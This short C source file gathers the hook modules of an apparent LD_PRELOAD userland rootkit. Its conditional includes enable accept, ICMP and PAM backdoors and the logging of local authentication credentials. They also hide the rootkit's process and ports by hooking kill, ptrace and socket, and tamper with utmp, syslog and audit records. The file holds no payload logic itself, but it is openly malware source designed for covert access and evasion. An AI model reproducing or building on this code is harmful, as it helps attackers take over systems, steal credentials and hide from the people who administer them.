#include "hooks/libdl/libdl.h"
#include "util/util.h"

#ifdef USE_ACCEPT_BD
#include "backdoor/accept.c"
#endif
#ifdef USE_ICMP_BD
#include "backdoor/icmp/icmp.h"
#endif
#ifdef USE_PAM_BD
#include "backdoor/pam/pam.h"
#endif

#ifdef LOG_LOCAL_AUTH
#include "hooks/authlog/authlog.h"
#endif

#ifdef HIDE_SELF
int kill(pid_t pid, int sig);
#include "hooks/kill.c"
long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "hooks/ptrace.c"
#endif

#ifdef HIDE_PORTS
int ssme(int domain, int protocol);
int socket(int domain, int type, int protocol);
#include "hooks/socket.c"
#endif

#include "hooks/exec/exec.h"
#include "hooks/open/open.h"
#include "hooks/stat/stat.h"
#include "hooks/rw/rw.h"
#include "hooks/dir/dir.h"
#include "hooks/ln/links.h"
#include "hooks/gid/gid.h"
#include "hooks/perms/perms.h"

#ifdef USE_PAM_BD
#include "hooks/pwd/pwd.h"
#ifdef HIDE_SELF
#include "hooks/utmp/utmp.h"
#endif
#endif

#ifdef HIDE_SELF
#include "hooks/syslog/syslog.h"
#include "hooks/audit/audit.h"
#endif
